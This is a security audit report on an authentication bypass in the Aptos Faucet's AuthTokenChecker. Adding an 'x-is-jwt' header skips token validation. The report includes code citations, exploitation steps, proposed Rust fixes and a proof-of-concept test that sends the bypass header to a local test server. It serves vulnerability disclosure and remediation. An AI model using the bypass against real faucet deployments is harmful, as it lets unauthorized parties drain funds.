# Audit Report

## Title
Authentication Bypass via X-IS-JWT Header in Aptos Faucet AuthTokenChecker

## Summary
The `AuthTokenChecker` in the Aptos Faucet contains a critical authentication bypass vulnerability. When the `x-is-jwt` header is present in a request, the checker skips all token validation and returns success, regardless of whether valid credentials are provided. If JWT validation is not configured elsewhere (via `RedisRatelimitChecker` with JWT mode), attackers can completely bypass authentication by simply adding this header.

## Finding Description
The vulnerability exists in the `check()` function of `AuthTokenChecker`: [1](#0-0) 

This code uses `contains_key()` which only verifies the header's existence, not its value or authenticity. The design assumes that if `X_IS_JWT_HEADER` is present, JWT validation occurs elsewhere. However, there is no dedicated JWT validation checker in the system. [2](#0-1) 

JWT validation only occurs in `RedisRatelimitChecker` when explicitly configured with JWT-based rate limiting: [3](#0-2) 

**Attack Scenario:**

A vulnerable configuration exists when a faucet uses:
- `AuthTokenChecker` (to validate Bearer tokens)
- `MagicHeaderChecker` or other checkers
- But does NOT use `RedisRatelimitChecker` with JWT configuration

This exact vulnerable configuration exists in the codebase: [4](#0-3) 

**Exploitation Steps:**
1. Attacker sends POST request to `/fund` endpoint
2. Includes `x-is-jwt: true` header (any value works due to `contains_key()`)
3. Includes valid `MagicHeader` (which may be discoverable/guessable)
4. `AuthTokenChecker.check()` sees the header and returns `Ok(vec![])` without validation
5. Other checkers pass if their conditions are met
6. Request is approved without any valid authentication token

The checker execution flow shows no race conditions are possible: [5](#0-4) 

Checkers execute sequentially in a deterministic order based on cost: [6](#0-5) 

## Impact Explanation
**Severity: High**

While the faucet is an auxiliary service (not part of core consensus), this vulnerability allows:

1. **Unauthorized Fund Distribution**: Attackers can drain faucet funds without valid credentials
2. **Test Network Disruption**: Affects devnet/testnet operations used by developers
3. **Service Abuse**: Rate limits may be the only protection, easily circumvented with multiple IPs
4. **Authentication Bypass**: Complete circumvention of the intended security model

This qualifies as **High Severity** under Aptos bug bounty criteria for "Significant protocol violations" and potential "Limited funds loss" categories.

## Likelihood Explanation
**Likelihood: High**

- **Ease of Exploitation**: Trivial - only requires adding an HTTP header
- **No Special Access Required**: Any external attacker can exploit this
- **Discovery**: Header name is visible in source code and may be discoverable through reconnaissance
- **Common Configuration**: The vulnerable configuration pattern is demonstrated in the codebase's own test configs
- **Impact Surface**: Affects any faucet deployment using `AuthTokenChecker` without proper JWT validation

## Recommendation

**Immediate Fix**: Add explicit JWT validation when `X_IS_JWT_HEADER` is present:

```rust
// In auth_token.rs, replace lines 37-40 with:
if data.headers.contains_key(X_IS_JWT_HEADER) {
    return Err(AptosTapError::new(
        "JWT authentication must be validated by a dedicated JWT checker. AuthTokenChecker cannot process JWT requests.".to_string(),
        AptosTapErrorCode::AuthTokenInvalid,
    ).into());
}
```

**Architectural Fix**: Create a dedicated `FirebaseJwtChecker` that validates JWTs:

```rust
pub struct FirebaseJwtChecker {
    pub jwt_verifier: FirebaseJwtVerifier,
}

#[async_trait]
impl CheckerTrait for FirebaseJwtChecker {
    async fn check(&self, data: CheckerData, _dry_run: bool) -> Result<Vec<RejectionReason>, AptosTapError> {
        if !data.headers.contains_key(X_IS_JWT_HEADER) {
            return Ok(vec![]); // Not a JWT request
        }
        
        match self.jwt_verifier.validate_jwt(data.headers.clone()).await {
            Ok(_) => Ok(vec![]),
            Err(e) => Ok(vec![RejectionReason::new(
                format!("JWT validation failed: {}", e.message),
                RejectionReasonCode::AuthTokenInvalid,
            )]),
        }
    }
    
    fn cost(&self) -> u8 { 10 }
}
```

**Configuration Validation**: Add startup validation to ensure JWT validation is configured when `AuthTokenChecker` is used.

## Proof of Concept

```rust
#[tokio::test]
async fn test_auth_token_bypass_vulnerability() -> Result<()> {
    // Setup: Use testing_checkers.yaml config (AuthToken + MagicHeader, no JWT validation)
    make_auth_tokens_file(&["valid_token_123"])?;
    let config_content = include_str!("../../../configs/testing_checkers.yaml");
    let (port, _handle) = start_server(config_content).await?;
    
    // Attack: Request with x-is-jwt header but NO valid token
    let response = reqwest::Client::new()
        .post(get_fund_endpoint(port))
        .body(get_fund_request(Some(100)).to_json_string())
        .header(CONTENT_TYPE, "application/json")
        .header("what_wallet_my_guy", "the_wallet_that_rocks") // Valid magic header
        .header("x-is-jwt", "true") // Bypass trigger - NO valid JWT provided!
        // NOTE: No Authorization header with valid token!
        .send()
        .await?;
    
    // Vulnerability: Request succeeds without valid credentials
    assert_eq!(response.status(), StatusCode::OK);
    
    // Proof: Same request WITHOUT x-is-jwt header fails
    let response_without_bypass = reqwest::Client::new()
        .post(get_fund_endpoint(port))
        .body(get_fund_request(Some(100)).to_json_string())
        .header(CONTENT_TYPE, "application/json")
        .header("what_wallet_my_guy", "the_wallet_that_rocks")
        // No x-is-jwt header, no valid token
        .send()
        .await?;
    
    // This correctly fails due to missing valid token
    assert_eq!(response_without_bypass.status(), StatusCode::BAD_REQUEST);
    
    Ok(())
}
```

**Notes**

This vulnerability affects the Aptos Faucet service specifically, which is an auxiliary component used for test token distribution on devnet/testnet environments. While it does not directly impact consensus, validator operations, or mainnet security, it represents a critical authentication bypass in the faucet's security model that allows unauthorized fund distribution. The issue stems from an incomplete security assumption where the presence of the `x-is-jwt` header is treated as sufficient evidence of JWT-based authentication, without actual validation occurring in configurations that lack JWT verification.

### Citations

**File:** crates/aptos-faucet/core/src/checkers/auth_token.rs (L37-40)
```rust
        // Don't check if the request has X_IS_JWT_HEADER set.
        if data.headers.contains_key(X_IS_JWT_HEADER) {
            return Ok(vec![]);
        }
```

**File:** crates/aptos-faucet/core/src/checkers/mod.rs (L134-145)
```rust
/// This enum has as its variants all possible implementations of CheckerTrait.
#[enum_dispatch(CheckerTrait)]
pub enum Checker {
    AuthTokenChecker,
    GoogleCaptchaChecker,
    IpBlocklistChecker,
    MagicHeaderChecker,
    MemoryRatelimitChecker,
    RedisRatelimitChecker,
    RefererBlocklistChecker,
    TapCaptchaChecker,
}
```

**File:** crates/aptos-faucet/core/src/checkers/redis_ratelimit.rs (L44-51)
```rust
    pub async fn ratelimit_key_value(&self, data: &CheckerData) -> Result<String, AptosTapError> {
        match self {
            RatelimitKeyProvider::Ip => Ok(data.source_ip.to_string()),
            RatelimitKeyProvider::Jwt(jwt_verifier) => {
                jwt_verifier.validate_jwt(data.headers.clone()).await
            },
        }
    }
```

**File:** crates/aptos-faucet/configs/testing_checkers.yaml (L7-16)
```yaml
checker_configs:
  - type: "AuthToken"
    file: "/tmp/auth_tokens.txt"
  - type: "IpBlocklist"
    file: "/tmp/ip_blocklist.txt"
  - type: "RefererBlocklist"
    file: "/tmp/referer_blocklist.txt"
  - type: "MagicHeader"
    magic_header_key: "what_wallet_my_guy"
    magic_header_value: "the_wallet_that_rocks"
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L262-270)
```rust
        let mut rejection_reasons = Vec::new();
        for checker in &self.checkers {
            rejection_reasons.extend(checker.check(checker_data.clone(), dry_run).await.map_err(
                |e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError),
            )?);
            if !rejection_reasons.is_empty() && self.return_rejections_early {
                break;
            }
        }
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L141-143)
```rust
        // Sort Checkers by cost, where lower numbers is lower cost, and lower
        // cost Checkers are at the start of the vec.
        checkers.sort_by_key(|a| a.cost());
```
